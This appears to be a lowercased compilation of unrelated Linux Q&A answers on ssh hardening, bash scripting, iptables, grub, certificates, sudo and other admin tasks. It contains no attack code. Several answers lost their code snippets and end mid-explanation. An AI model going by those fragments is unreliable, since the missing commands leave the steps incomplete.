see the manpage : -u {vimrc} use the commands in the file {vimrc} for initializations . all the other initializations are skipped . use this to edit a special kind of files . it can also be used to skip all initializations by giving the name " none " . see ":help initialization " within vim for more details .
why root over ssh is bad there are a lot of bots out there which try to log in to your computer over ssh . these bots work the following way . they execute something like ssh root@$IP and then they try standard passwords like " root " or " password123" . they do this as long as they can , until they found the right password . on a world wide accessible server you can see a lot of log in tries in your log files . i can go up to 20 per minute or more . when the attackers have luck ( or enough time ) , and find a password , they would have root access and that would mean you are in trouble . but when you disallow root to log in over ssh , the bot needs first to guess a user name and then the matching password . so lets say there list of plausible passwords has N entries and there list of plausible users is M entries large . the bot has to a set of N*M entries to test , so this makes it a little bit harder for the bot compared to the root case where it is only a set of size N . some people will say that this additional M is not a real gain in security and i can agree that it is only a small security enhancement . but i think of this more as these little padlocks which are in it self not secure , but they hinder a lot of people from easy access . this of course is only valid if your machine has no other standard users names , like toor or apache . the better reason to not allow root is that root can do a lot more damage on the machine then a standard user can do . so if by dumb luck they find your password the whole system is lost . while with a standard user account you only could manipulate the files of that user ( which is still very bad ) . in the comments it was mentioned that a normal user could have the right to use sudo and if this users password would be guessed the system is totally lost too . in summary i would say that it does not matter which users password an attacker gets . when they guess one password you can not trust the system anymore . an attacker could use the right of that user to execute commands with sudo the attacker could also exploit a weakness in your system and gain root privileges . if an attacker had access to your system you can not trust it anymore . the thing to remember here is that every user in your system that is allowed to log in via ssh is an additional weakness . by disabling root you remove one obvious weakness . why passwords over ssh are bad the reason to disable passwords is really simple . users choose bad passwords ! the whole idea of trying passwords only works when the passwords are guessable . so when a user has the password " pw123" your system becomes insecure . another problem with password chosen by people is that there passwords a never truly random because there would then be hard to remember . also is it the case that users reuse there passwords so they use it to log in to facebook or there gmail accounts and for your server . so when a hacker gets this users facebook account password he could get into your server and the user could lose it through phishing or the facebook server might got hacked . but when you use a certificate to log in the user does not choose his password . the certificate is based on a random string which is very long from 1024 bits up to 4096 bits ( ~ 128 - 512 character password ) . additionally this certificate is only there to log in to your server and is not used with anything else . links http://bsdly.blogspot.de/2013/10/the-hail-mary-cloud-and-lessons-learned.html this article comes from the comments and i wanted to give it a bit more prominent position , since it goes a little bit deeper into the matter of botnets that try to log in via ssh how they do it , how the log files look like and what one ca do to stop them . it is written by peter hansteen .
using os.system() in python to get the output from calling a command is not the way to go . for single commands you can use the function check_output() from the subprocess module . in your situation i would take a look at plumbum it allows you to do things in python like : from plumbum.cmd import zcat, grep chain = zcat["your_file_name.gz"] | grep["-i", "pattern"] result = chain()  and then get the numbers you need from the result variable ( a string ) . you will need to install plumbum using pip or easy_install
you can try to see if the key gives the expected keycode with xev and pressing the key to see the actual keycode it generates . i have seen ' working ' keyboards that had some fluid spilled over them generate wrong ( and multiple ) keycodes . it looks like you are in ' us ' mode with your keyboard . on that my &larr ; generates keycode 113 , so the muting does not seem be completely unexpected given your .Xmodmap . make sure to restart x ( logout of the windowmanager and log back in ) , to make sure changes to . xmodmap take effect .
captions are fairly limited - once a caption is added , there is no known command to remove them . one thing you can do is hide the text in them by replacing the caption in the outer session : &lt;ctrl&gt;-a :caption string '%{kk}'  ( where kk is black/black . ) you will still have a wasted line of real estate but the outer session 's caption line will be cleared and hopefully not distracting you . and you will still have the problem that you are nested - you can not kill the outer without killing the ssh process that you started from it . all of your screen commands to the inner screen will have to be prefixed with an extra ' a ' .
update-alternatives changes the application to use to open a web browser , not the application to use to open a web page . the two are not directly related : “i want to browse the web” is different from “i want to browse this web page” , and there are different kinds of content that happen to all open in a web browser . what you need to change is which application is associated with the mime type text/html , and perhaps others . these are configured through the /etc/mailcap file . on debian , /etc/mailcap is automatically generated from the applications you have installed . when multiple applications can open the same type , there is a priority system ( similar , but distinct , from the priority system for alternatives ) . you can override these priorities by adding entries to /etc/mailcap.order . for example , the following line will cause firefox to be used in preference of any other application for all the types it supports : firefox:*/*  after you have changed /etc/mailcap.order , run /usr/sbin/update-mime as root to update /etc/mailcap . if you want to use a program that does not come from a debian package , edit it directly into /etc/mailcap , in the User Section . if you want to set preferences for your own account , define them in ~/.mailcap: the entries in that file override the ones in /etc/mailcap . you have to put full mailcap lines there , such as text/html; /home/user/firefox/firefox '%s'; description=HTML Text; test=test -n "$DISPLAY"; nametemplate=%s.html 
just use time when you call the script . time yourscript.sh 
you could try the ultimate linux newbie guide videos or read the linux . org beginner guide but to be honest , if you are going for something like ubuntu you will find it very easy , and if you do not , there is a stack of info over on askubuntu.com, including this question which should have what you will need .
if you have a set of directories that you want to incorporate into a iso file you can do it using this command : % mkisofs -o ~/my_iso.iso -r -J -hide-rr-moved -V "Title of ISO" \ -graft-points "Directory1/=/home/me/dir1" "Directory2/=/home/me/dir2"  the above command switches are as follows : hiding files i believe you could modify the above and add the switch -hide-joliet &lt;pattern&gt; . this will filter any files matching the &lt;pattern&gt; . for example : note : --hidden can also be used to " hide " files . but both these switches are a misnomer . the files are still present on the disk and anyone with admin rights can see them on the disk . there is an attribute that is set on the iso file system noting whether a file is hidden or not . this hidden facility is ms-dos and windows command specific ! ntfs attributes the op had several questions regarding ntfs file system attributes such as h ( hidden ) and s ( system files ) . the attributes , including : h - hidden s - system etc . . . . are file system attributes that are part of ntfs ( these are not part of the file itself ) . these attributes are not directly supported by joliet/udf . i believe the ntfs attributes are applied ( in this case only hidden is supported ) to the udf/joliet file system in the iso .
use while read loop : : &gt; another_file ## Truncate file. while IFS= read -r LINE; do command --option "$LINE" &gt;&gt; another_file done &lt; file  another is to redirect output by block : while IFS= read -r LINE; do command --option "$LINE" done &lt; file &gt; another_file  last is to open the file : if one of the commands reads input , it would be a good idea to use another fd for input so the commands will not eat it : while IFS= read -ru 3 LINE; do ... done 3&lt; file  finally to accept arguments , you can do : which one could run as : bash script.sh file another_file  extra idea . use readarray: readarray -t LINES &lt; "$FILE" for LINE in "${LINES[@]}"; do ... done 
this is cannot be achieved without source modification according to : http://icculus.org/pipermail/openbox/2013-may/007960.html however there are 2 walkarounds : one above from varl0ck one with wmctrl + xbindkeys apps , like : http://icculus.org/pipermail/openbox/2013-may/007963.html
you can use grep on your mbr to figure out : sudo dd if=/dev/sda bs=512 count=1 2&gt;&amp;1 | grep GRUB sudo dd if=/dev/sda bs=512 count=1 2&gt;&amp;1 | grep LILO  only one of those should return a match . for more information and other ways to figure out , check this answer in askubuntu .
you probably did a copy that preserved the original group and owner of these files . within linux internally the owner and group is basically just an id ( in your case , the number 515 ) . this id is then mapped on a group and user name listed in /etc/passwd or /etc/group . you will see that in those files , you can find the name of the user and also the id used for that specific user and group . most likely in the /etc/group and /etc/passwd , the id "515" is not listed , and for this reason the id itself is shown . you can change the ower and group to an existing owner and group with the commands chown and chgrp respectively .
you can use tee ( 1 ) to multiplex the stream , e.g. you might also be interested in soxs ' synth effect , which can produce most tones and sweeps , e.g. sox -n -r 44100 test.wav synth 4 sine 100:1000 
i think that you do not need any regular expressions here . just try to search for a fixed string with grep . you can enable fixed string matching with the -F switch . given that your command line looks like (filenames are produced here) | \ while read f ; \ do mdfind -name "$f" | grep -F "/$f" ; \ done 
in my experience , /usr/bin/mail is a binary executable , but on your system the shell seems to be loading and interpreting it . syntax error near unexpected token is a bash diagnostic . this can happen if you have overwritten an executable . is there any conceivable chance that you have overwritten /usr/bin/mail with the text " config file not found ( -s ) " , causing said text to be fed to the shell when you try to execute it ?
i have a standard function i use in bash for this very purpose : there is probably more elegant ways ( i wrote this ages ago ! ) , but this works fine for me .
your question is not very clear , but maybe this shell command helps . for x in *.bam; do bedtools bamTobed -i "$x" &gt;"${x%.bam}.bed" done 
you can set the " immutable " attribute with most filesystems in linux . chattr +i foo/bar  to remove the immutable attribute , you use - instead of +: chattr -i foo/bar  to see the current attributes for a file , you can use lsattr : lsattr foo/bar  the chattr ( 1 ) manpage provides a description of all the available attributes . here is the description for i:
ppp writes a line to the logs on a disconnect , stating how many bytes were transfered each way . there is a built-in byte counter in linux 's networking filter . run iptables -nvxL: if you have not configured any firewall , you will see lines like Chain INPUT (policy ACCEPT 720984 packets, 55279820 bytes)  this means that a total of 55mb were downloaded , but this is not the number you want : it includes all network interfaces , even the loopback interface . the numbers are tracked for each chain , so you can get the number you want by putting all your isp 's packet through another chain . iptables -N isp_in iptables -A INPUT -i eth0 -j isp_in iptables -P isp_in ACCEPT  you will need to save the counter values each time you disconnect , and do the additions . i am not aware of an application that does this but i would be surprised if one does not already exist . note that if you reboot , the counter values are lost . you should save the counter values periodically to avoid large amounts going undetected .
use ./ before your filename : scp ./test.json-2014-08-07T11:17:58.662378 remote:tmp/  that make scp know it is a file . without it , scp thinks it is a hostname because of the colon .
my bios software/hardware must be flaky : my laptop was switched off for some hours , and the keys were swapped back on restart .
i would prefer a plain bash way : command "${my_array[@]/#/-}" "$1"  one reason for this are the spaces . for example if you have : my_array=(option1 'option2 with space' option3)  the sed based solutions will transform it in -option1 -option2 -with -space -option3 ( length 5 ) , but the above bash expansion will transform it into -option1 -option2 with space -option3 ( length still 3 ) . rarely , but sometimes this is important , for example :
it depends on the file or directory . for example , some web server setups allow the machine 's users to publish files as http://server.name/~username , with the files typically living in that user 's subdirectory . httpd will probably need execute permissions on the directory containing the files and all of the directories above it in the path , due to the way it processes urls . in other words , if you have ~username/public_html set to 777 , but ~username is 700 , apache probably can not serve the files . the broader answer to the question requires you to consider all the daemons running in the system . they typically do not run as either root or your user , so they do not automatically have permissions for any files in your directory unless given them explicitly .
use the geometry argument . $ abiword --geometry=[YOUR_SCREEN_WIDTH]x[YOUR_SCREEN_HEIGHT]
do following vim /home/&lt;username&gt;/.gconf/apps/panel/toplevels/bottom_panel/%gconf.xml  or vim /home/&lt;username&gt;/.gconf/apps/panel/toplevels/top_panel/%gconf.xml  if you renamed your panel , change top_panel or bottom_panel accordingly . look for orientation section &lt;entry name="orientation" mtime="1356417211" type="string"&gt; &lt;stringvalue&gt;bottom&lt;/stringvalue&gt; &lt;/entry&gt;  change bottom to top , left or right .
there is no way to peek at the content of a pipe , nor is there a way to read a character to the pipe then put it back . the only way to know that a pipe has data is to read a byte , and then you have to get that byte to its destination . so do just that : read one byte ; if you detect an end of file , then do what you want to do when the input is empty ; if you do read a byte then fork what you want to do when the input is not empty , pipe that byte into it , and pipe the rest of the data . test -t 0 has nothing to do with this ; it tests whether standard input is a terminal . it does not say anything one way or the other as to whether any input is available .
if your Det.xml is always going to look like that ( e . g . will not have any extra ResponseType nodes ) , you can simply use this : xmllint --xpath 'string(//ResponseType)' Det.xml  and it will spit out : success if your xmllint does not have xpath for some reason , you can always fall back to regular expressions for this sort of thing : grep -Po '(?&lt;=&lt;ResponseType&gt;)\w+(?=&lt;/ResponseType&gt;)' Det.xml  it uses perl regular expressions to allow for the positive look aheads / look behinds and only shows the matched part ( not the whole line ) . this will output the same as above without using xmllint / xpath at all .
the ' best ' way to do this , is building it as a package . you can then distribute and install it to any ubuntu machine running the same ( major ) version . for building vanilla kernels from source , there is a tool make-kpkg which can build the kernel as packages . other major advantages : easy reverting by just removing the package , automatic triggers by the package management such as rebuilding dkms , etc . the ubuntu community wiki on kernel/compile alternate build method provides a few steps on how to do that . basically , it is just the same as building the kernel from upstream documentation , but instead of having make blindly installing it on your system , have it build in a ' fake root ' environment and make a package out of it , using fakeroot make-kpkg --initrd --append-to-version=-some-string-here \ kernel-image kernel-headers  this should produce binary .deb files which you will be able to transfer to other machines and install it using dpkg -i mykernelfile-image.deb mykernelfile-headers.deb ... 
the x resource database is a kind of configuration abstraction ( somewhat analogous to the ms-windows registry ) . you create/manage one or more text configuration files ( system wide ones , and ~/.Xdefaults ) , these are loaded into the x server by during the startup process , and applications can query the relevant settings instead of ( though often as well as ) custom configuration files . you need to keep reading that xscreensaver man page , the configuration section tells you exactly what to do : the syntax of the . xscreensaver file is similar to that of the . xdefaults file ; for example , to set the timeout parameter in the . xscreensaver file , you would write the following :  timeout: 5  whereas , in the .Xdefaults file , you would write  xscreensaver.timeout: 5  if you change a setting in your x resource database , or if you want xscreensaver to notice your changes immediately instead of the next time it wakes up , then you will need to reload your . xdefaults file , and then tell the running xscreensaver process to restart itself , like so : xrdb &lt; ~/.Xdefaults xscreensaver-command -restart  do not forget the xrdb step , changes to resource files need to be imported . you do not need to enter every setting into your .Xdefaults , only the changes relative to those set in the ( system dependent ) app-defaults . xrdb -all -query | grep xscreensaver will help . trading one configuration file for another is not a great leap , but x resource files let you keep any and all resource-aware application settings together , and also offers dynamic configuration by way of pre-processing ( e . g . dependent on host and client settings ) .
the main entry point is god . be it a c or c++ source file , it is the center of the application . only in the same way that nitrogen is the center of a pine tree . it is where everything starts , but there is nothing about c or c++ that makes you put the " center " of your application in main() . a great many c and c++ programs are built on an event loop or an i/o pump . these are the " centers " of such programs . you do not even have to put these loops in the same module as main() . not only do i want the main entry point to be the first thing that is executed , i also want it to be the first thing that is compiled . it is actually easiest to put main() last in a c or c++ source file . c and c++ are not like some languages , where symbols can be used before they are declared . putting main() first means you have to forward-declare everything else . there was a time when proprietary and closed-source libraries were common . thanks to apple switching to unix and microsoft shooting themselves in the foot , that time is over . " tell ' im ' e 's dreamin ' ! " os x and ios are full of proprietary code , and microsoft is not going away any time soon . what do microsoft 's current difficulties have to do with your question , anyway ? you say you might want to make dlls , and you mention automake 's inability to cope effectively with windows . that tells me microsoft remains relevant in your world , too . static linking is a real bitch . really ? i have always found it easier than linking to dynamic libraries . it is an older , simpler technology , with fewer things to go wrong . static linking incorporates the external dependencies into the executable , so that the executable stands alone , self-contained . from the rest of your question , that should appeal to you . you can #include the libraries as headers no . . . you #include library headers , not libraries . this is not just pedantry . the terminology matters . it has meaning . if you could #include libraries , #include &lt;/usr/lib/libfoo.a&gt; would work . in many programming languages , that is the way external module/library references work . that is , you reference the external code directly . c and c++ are not among the languages that work that way . if the c library was not designed to conform to c++ 's syntax , you are screwed . no , you just have to learn to use c++ . specifically here , extern "C" . how might i write such a thing in preprocessor lingo ? it is perfectly legal to #include another c or c++ file : we do not use extern "C" here because this pulls the c and c++ code from those other libraries directly into our c++ file , so the c modules need to be legal c++ as well . there are a number of annoying little differences between c and c++ , but if you are going to intermix the two languages , you are going to have to know how to cope with them regardless . another tricky part of doing this is that the order of the #includes is more sensitive than the order of library references if a linker command . when you bypass the linker in this way , you end up having to do some things manually that the linker would otherwise do for you automatically . to prove the point , i took minibasic ( your own example ) and converted its script.c driver program to a standalone c++ program that says #include &lt;basic.c&gt; instead of #include &lt;basic.h&gt; . ( patch ) just to prove that it is really a c++ program now , i changed all the printf() calls to cout stream insertions . i had to make a few other changes , all of them well within a normal day 's work for someone who is going to intermix c and c++: the minibasic code makes use of c 's willingness to tolerate automatic conversions from void* to any other pointer type . c++ makes you be explicit . newer compilers are no longer tolerating use of c string constants ( e . g . "Hello, world!\\n" ) in char* contexts . the standard says the compiler is allowed to place them into read-only memory , so you need to use const char* . that is it . just a few minutes work , patching gcc complaints . i had to make some similar changes in basic.c to those in the linked script.c patch file . i have not bothered posting the diffs , since they are just more of the same . for another way to go about this , study the sqlite amalgamation , as compared to the sqlite source tree . sqlite does not use #include all the other files into a single master file ; they are actually concatenated together , but that is also all #include does in c or c++ .
as the author explains : systemd honours the sixth field in the fstab lines to do fsck . you can also force fsck at boot time by passing fsck.mode=force as a kernel parameter
i am assuming you are running recent version of ubuntu or a distribution based on upstart . you can check /var/log/daemon.log for errors . the standard su takes the syntax su [options] [username] . checkout man 1 su . you might want to try : su -c "myCommand" anotheruser &gt;&gt; "myLogfile.log"  also , a couple of things would happen ( mostly not desirable ) myLogfile.log would be owned by root . myLogfile.log would be created on / ( root directory ) if you do not use an absolute path like /tmp/myLogfile.log ( because upstart runs with pwd set to / ) . if you want the file to be owned by anotheruser you might switch the command to . su -c "myCommand &gt;&gt; /tmp/myLogfile.log" anotheruser  this might cause problems if you have leftover myLogfile.log owned by root from earlier runs or if have not changed myLogfile.log to something like /tmp/myLogfile.log ( normally , regular users can not create files on root dir / ) .
the process started by xterm will be the session leader in control of the terminal . when the terminal goes away , that process automatically receive a sighup signal ( followed by a sigcont ) . this is sent by the kernel in a similar way that processes receive sigint when you press ctrl-c . additionally , a shell may send sighup to some of its children upon exiting ( see disown in some shells to disable that )
you can try disable the gnome shortcuts in edit -> keyboard shortcuts , so the window will not eat up the function keys . there seems to be a known gnome-terminal bug relating to this . alternatively if this does not work , you will have to use another terminal that explicitly sends function keys as control codes to the terminal . rxvt is one i can recommend , or xterm .
in many shells including ksh , zsh and bash , time is a keyword and is used to time pipelines . time foo | bar  will time both the foo and bar commands ( zsh will show you the breakdown ) . it reports it on the shell 's stderr . time foo.sh &gt; bar.txt  will tell you the time needed to open bar.txt and run foo.sh . if you want to redirect time 's output , you need to redirect stderr in the context where time is started like : { time foo.sh; } 2&gt; bar.txt  this : 2&gt; bar.txt time foo.sh  works as well but with ksh93 and bash , because it is not in first position , time is not recognised as a keyword , so the time command is used instead ( you will probably notice the different output format , and it does not time pipelines ) . note that both would redirect both the output of time and the errors of foo.sh to bar.txt . if you only want the time output , you had need : { time foo.sh 2&gt;&amp;3 3&gt;&amp;-; } 3&gt;&amp;2 2&gt; bar.txt  note that posix does not specify whether time behaves as a keyword or builtin ( whether it times pipelines or single commands ) . so to be portable ( in case you want to use it in a sh script which you want portable to different unix-like systems ) , you should probably write it : command time -p foo.sh 2&gt; bar.txt  note that you can not time functions or builtins or pipelines or redirect foo.sh errors separately there unless you start a separate shell as in : command time -p sh -c 'f() { blah; }; f | cat'  but that means the timing will also include the startup time of that extra sh .
important : you can always override your default options with local options . from man pppd  /etc/ppp/options System default options for pppd, read before user default options or command-line options.  and also ~/.ppprc /etc/ppp/options.ttyname /etc/ppp/peers  you should enable debug options ( sometimes also kdebug ) your exit codes  EXIT STATUS 16 The link was terminated by the modem hanging up.  and so on . your error is LCP terminated by peer there are several links which explain how to fix it : you'll need to pass "refuse-eap" option to pppd. ubuntu lcp_term_authentication or simply check your credentials .
it seems that manually editing out the parameter containing rd.lvm.lv=fedora_old/swap in the grub configuration file does the trick . there is no need to run dracut or reinstall grub at all . # vi /boot/efi/EFI/fedora/grub.cfg  search for the following line under the menu entry which you will be booting from : linuxefi /vmlinuz-3.12 . x-xxx . fc20 . x86_64 root=/dev/mapper/fedora_new-root00 ro rd . lvm . lv=fedora_old/swap rd . lvm . lv=fedora_new/swap vconsole . font= . . . . to make sure the above changes stick , do the same for /etc/default/grub: grub_cmdline_linux=" rd . lvm . lv=fedora_old/swap rd . lvm . lv=fedora_new/swap vconsole . font= . . . please provide an answer or leave a comment if this method is wrong .
use pam_limits ( 8 ) module and add following two lines to /etc/security/limits.conf: root hard nofile 8192 root soft nofile 8192  this will increase rlimit_nofile resource limit ( both soft and hard ) for root to 8192 upon next login .
it is specific to curl . from man curl:
unfortunately the script has the auth file path hard-coded relying on the shell expansion of the home directory : self.auth_path = os.path.expanduser('~/.cloudprintauth')  my recommendation is that you patch the file by changing that line to an absolute path : self.auth_path = os.path.expanduser('/root/.cloudprintauth')  hopefully it will do the trick .
initial setup : touch 01-foo.sql 02-bar.sql 02-baz.sql 03-foo1.sql 04-buz.sql 09-quux.sql 10-lala.sql 99-omg.sql actual code : curr=02; for file in ??-*.sql; do ver="${file:0:2}"; [ "$ver" -gt "$curr" ] &amp;&amp; echo "$file"; done i.e. , define the current version to be 02 and then look at all files ( the globbing is alphabetical ) , executing them if their number prefix is numerically greater . substitute mysql ( or what have you ) for echo .
turns out richard was right . the list:set type is indeed the solution although i find the wording in the documentation somewhat confusing , if not misleading . it is possible to have , say the following contents to be used with ipset restore: create dns4 hash:ip family inet create dns6 hash:ip family inet6 create dns list:set add dns dns4 add dns dns6  you can then use ipset add to add ips to the member sets ( i.e. . dns4 and dns6 respectively ) , but not to the super set ( dns ) of type list:set . however the SET ( -j SET --add-set dns src --exist ) target can actually be told to add the ip to dns and will then only add to the set for which it is possible , which in our case depends on the family option . this will be harder with more sets that could be eligible for adding and ip ( or network or . . . ) in which case the first one will be used to add the entry . this means that list:set can be used to halve the number of rules where otherwise you had have to match an ip set per ipv4 and ipv6 rule respectively with an otherwise identical rule .
no , setting the bit would have no effect during boot . during the boot proper , all proccesses run as root . as daemons are spawned , some are run as the appropriate daemon user , but unless your script is called by one of them instead of the init scripts you do not need the suid bit .
extract the 30_os-prober script from the grub package . in the case of arch linux : /var/cache/pacman/pkg/grub*.tar.xz if you did not clean the package cache .
you are looking for the array size of bar : depending of the input you get the information how many words bar contains . the ${#bar[@]} gives the number of elements bar contains .
thank guys for all the replies , but no one matched my needs . i wanted something non-intrusive , and i found it in cw . this is a nice soft that you need to add in the begining of your path . so of course , it does not work with every command ( only the ones already defined ) , but the result looks very nice ! check it out if you are interested : http://freecode.com/projects/cw
you can use ctrl + j or ctrl + m as an alternative to enter . they are the control characters for linefeed ( lf ) and carriage return ( cr ) .
firstly , we need to prepend /sys to the path returned by udev , so that path becomes something like : /sys/devices/pci0000:00/0000:00:1d.0/usb5/5-2 . then go to this directory , and there will be several files in it . among others , there are busnum and devnum files , they contain these " logical " numbers . so , in bash script , we can retrieve them like that : also note that udev can return these busnum and devnum directly : in RUN+="..." we can use substitutions $attr{busnum} and $attr{devnum} respectively .
this decrementing can be done in a pretty low-tech way : generate the list , start at the beginning . it is not that easy to “productize” by handling all cases , but it is little more than a one-liner if you are willing to hard-code things like the maximum number of digits and to assume that there are no other files called dir.* . using bash syntax , tuned towards less typing : i=0 for x in dir.{?,??,???}; do mv "$x" "${x%.*}.$i" ((++i)) done  note that it has to be dir.{?,??,???} and not dir.* to get dir.9 before dir.10 . in zsh you could make this a little more robust at no cost , by using &lt;-&gt; to expand to any sequence of digits and (n) to sort numerically ( dir.9 before dir.10 ) . i=0 for x in dir.&lt;-&gt;(n); do mv $x ${x%.*}.$i ((++i)) done 
well , the key 's name is " super " . i particularly like super+r
in a grep regular expression , [ is a special character . for a literal [ , you need to backslash escape it , like so : \[ . note that the entirety of Nov 22 [0-9]: ... [10.50.98.68 is a regular expression . you can not just point to it and say " this part is a regex , this part should be a literal string " and expect grep to be able to read your thoughts . that is why you need to escape any special characters that are part of literal strings you want to match . unrelated , but each occurrence of [0-9] in your regular expression only matches a single character . also , . is a special character that will need to be escaped as well . you probably want something like the following for your regular expression : ^Nov 22 [0-9][0-9]:[0-9][0-9]:[0-9][0-9] Received Packet from \[10\.50\.98\.68 
you can try it yourself : echo &lt;(echo) &lt;(echo)  diff just reads from both the files . if you want to use &lt;(...) as a parameter to your bash script , just keep in mind you can not " rewind " the file ( or reopen ) . so once you read it , it is gone . you can use read to process it line by line , you can grep it or whatever . if you need to process it more than once , either save its content to a variable input=$(cat "$1"; printf x) # The "x" keeps the trailing empty lines. input=${input%x}  or copy it to a temporary file and read it over and over : tmp=$(mktemp) cat "$1" &gt; "$tmp" 
for your self signed certificate you probably did something like this : $ openssl req -x509 -nodes -days 365 -newkey rsa:2048 \ -keyout mysitename.key -out mysitename.crt  and then created lines like this for apache : with a ca signed cert things change slightly . you need to use the private.key that was used to sign the ca cert , and not the file that you used to do the self signing cert . in some cases you can export the key from the file that is given to you but we had need to know more information about the actual certificate file that you were given . example i have dealt with . p12 files where i have needed to extract the . key file from it . $ openssl pkcs12 -in star_qmetricstech_com.p12 -out star_qmetricstech_com.key  but with ssl certificates there are many types of container files and so you have to pay special attention to the different files , and which ones were used together . references how to create and install an apache self signed certificate
you want a program called realpath , used in conjunction with find . e.g. : find . -type l -exec realpath {} \; | grep -v "^$(pwd)" 
there is always a possibility of something going wrong with the files during or after transit , although in your case it might be more likely to be at the point things are written to tape . if the extra effort warrants it , i would calculate the md5 or sha1/sha256 sums for the files on your linux box and do that again on the windows box on which the tape drive is attached . i have used md5 on windows at some point , and i assume executables for the sha is available as well . if you cannot find an executable for either , install python on the windows machine and use : python -c "import hashlib; print hashlib.md5(open('xyz').read()).hexdigest();"  ( replacing xyz with the filename ) . best is of course to run the md5 check after reading back the files from tape , but that takes extra time .
you can tell by looking at /etc/redhat-release . here is how they look like on each system :
dns alone will not help you : it can point your client to a different machine , but that machine would have to serve the expected flickr content on port 80 . what you need is a proxy that receives http requests over http and reemits them using https . point your uploader to this proxy ; the proxy is the one making the dns request , not the client , so you do not need to fiddle with dns at all . apache with mod_proxy and mod_ssl is an easy , if heavyweight , such proxy . i can not think of a ready-made lighter-weight solution right now . modifying python 's SimpleHTTPServer could be another solution . to point a wine application to a proxy , see the wine faq §7.18 “how do i configure a proxy ? ” . there are two solutions : the usual unix solution : set the environment variable http_proxy , e.g. ( if your proxy is listening on port 8070 ) : export http_proxy=http://localhost:8070/ wine 'c:/Program Files/Flickr Uploader/Flickr Uploader.exe'  a wine method : set the [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings] ProxyEnable registry key ( see the wine faq for the syntax ) .
it is easier to chain ssh with ssh than to chain ssh with sudo . so changing the ssh server configuration is ok , i suggest opening up ssh for root of each server , but only from localhost . you can do this with a Match clause in sshd_config: PermitRootLogin no Match localhost PermitRootLogin yes  then you can set up a key-based authentication chain from remote user to local user and from local user to root . you still have an authentication trail so your logs tell you who logged in as root , and the authentication steps are the same as if sudo was involved . to connect to a server as root , define an alias in ~/.ssh/config like this : Host server-root HostName server.example.com User root ProxyCommand "ssh server.example.com nc %h %p"  if you insist on using sudo , i believe you will need separate commands , as sudo insists on reading from a terminal ( even if it has a ticket for your account ) ¹ , and none of the usual file copying methods ( scp , sftp , rsync ) support interacting with a remote terminal . sticking with ssh and sudo , your proposed commands could be simplified . on each side , if you have sudo set up not to ask a password again , you can run it once to get over with the password requirement and another time to copy the file . ( you can not easily copy the file directly because the password prompt gets in the way . ) ssh -t source 'sudo true' ssh -t target 'sudo true' ssh -t source 'sudo cat squid.conf' | ssh -t target 'sudo tee /etc/squid/squid.conf'  ¹ unless you have NOPASSWD , but then you would not be asking this .
you can use paste for this : paste -d '' aaaa.txt bbbb.txt &gt; cccc.txt  from your question , it appears that the first file contains ; at the end . if it did not , you could use that as the delimiter by using -d ';' instead .
you can use vbetool to turn the display on/off from the console . off : $ sudo vbetool dpms off  on : $ sudo vbetool dpms on  this command construct will turn it off , and then if you hit a key turn it back on : $ sudo sh -c 'vbetool dpms off; read ans; vbetool dpms on'  references [ solved ] how to turn off monitor at cli turn off monitor using command line
in the end there were no responses and few leads to solve this . i now use this perl script which goes through all accounts and moves out mail older than 30 days into folders in the following structure : /home/account/domain.com/mail/mailbox/.00 archive inbox . 2012.08 august /home/account/domain.com/mail/mailbox/.00 archive sent . 2012.08 august the only thing i do not like about this script is that it modifies the ctime ( unix epoc time ) of the moved mails to the current time . at least mtime is not changed .
apache itself explains what these fields are when queried . from this tutorial : the client , vhost and request are the columns that are of the most use . client is the ip of the person accessing the resource . vhost is the domain or subdomain being accessed . request is the actual file on the site that is being accessed .
cat /proc/scsi/scsi 
it is called brace expansion and is present also in zsh . one important difference between bash and zsh is that in zsh parameter expansion is performed inside braces , but in bash this is not the case .
the remote pc should receive on its port 8181 whatever packets are sent to the ubuntu box on port 8181 ? to test , you can : from your remote pc , connect to the ubuntu via vpn , and then ssh to the ubuntu once connected via the vpn , and in that ssh session , setup a reverse port forwarding : localhost:8181 8181 : this will forward everything coming to port 8181 on the ubuntu to go , via the tunnel ( so the ssh needs to be up ) to the pc on port 8181 . advantage : easy to test and setup . drawback : ssh needs to stay up ( needs keepalive ) otherwise , if you really want to forward from the ubuntu to the connected pc , it depends on the type of vpn you use , its firewalling rules , the pc 's firewalling rules , etc . much more difficult to setup ( especially if you cuold have several pcs coming in ) . try the ssh tunneling way first .
you can use sudo -nv 2&gt; /dev/null to get an exit value of 0 when the credentials were there without being prompted for the password . i have something like that for running fdisk and dropping the credentials if the were not there to begin with . combined with catching ctrl + c you would get something like ( i am not a good bash programmer ! ) :
the issue seems to be you are using an unprivileged user to test the nginx configuration . when the test occurs , it attempts to create /run/nginx . pid , but fails and this causes the configuration test to fail . try running nginx as root . $ sudo nginx -t or $ su - -c " nginx -t " this way , the nginx parent process will have the same permission it would when run by systemctl . if this resolves the error at testing , but not when run from systemctl , you may want to check this page on investigating systemd errors .
you are fine using java 7 to compile java 6 sources , it is backward compatible . if you are using the android plug-in with eclipse , you should get warnings for using java 7 features , and at any rate , when you go to compile any 1.7 specific code ( for each loops , &lt;&gt; , etc . ) , you will get an error . these are mostly trivial things that are easy to correct . so when it says you must have java 6 , what it means is you must have at least java 6 . i use 7 to compile android stuff .
in the old ufs , directory size was limited only by your disk space as directories are just files which - like other files - have effectively unbounded length . i do not know , but expect that jfs is no different . as to how much is too much , it reminds me of the story of the manager who notices that when there are more than 8 users on the machine , performance drops dramatically so he asks the system administrator to find the 8 in the code and change it to 16 . the point being that there is no 8 , it is an emergent property of the system as a whole . how to know how big is too big ? the only practical way is to add entries until it takes longer than you want . this is obviously a rather subjective approach but there is not any other . if you are looking to store 65k+ files , there are probably better approaches depending on the nature of your data and how you wish to access it .
copyrighted means there is a copyright and license protecting that . the license in the case of the linux kernel is gpl ( http://www.gnu.org/copyleft/gpl.html ) . in a nutshell , you are allowed to modify the code in any way you wish . however , if you republish your modified code , you have to license it gpl and keep the credit to the original authors . also , if you distribute compiled versions of the modified source , you have to distribute that modified source code . the kernel 's license is a so called " copyleft " , you do what you want but you have to let others do the same to your modifications . ps : this is a very simple explanation , for more information and details see the above link .
you could pipe it through sed to extract only what is inside the quote characters . e.g. $ echo 'looktype="123"' | sed -r -e 's/^.*"([^"]+)".*/\1/' 123  note that -r is specific to gnu sed , it tells sed to use extended rather than basic regexps . other versions of sed do not have it , or might use -E instead . otherwise write it in posix basic regular expression ( bre ) as : sed -e 's/^.*"\([^"][^"]*\)".*/\1/' 
